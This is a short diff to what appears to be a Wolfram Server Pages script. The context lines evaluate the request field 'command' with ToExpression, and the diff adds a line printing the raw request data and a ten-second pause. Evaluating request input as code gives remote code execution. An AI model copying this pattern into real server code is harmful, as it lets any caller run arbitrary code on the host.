@@ -1,4 +1,6 @@
 <?wsp
     $CurrentRequest["Redirect"] = "utils/redir.wsp";
+    Print[$CurrentRequest["Data"]];
+    Pause[10];
     $CurrentRequest["Data", "command"]//ToExpression;
 ?>
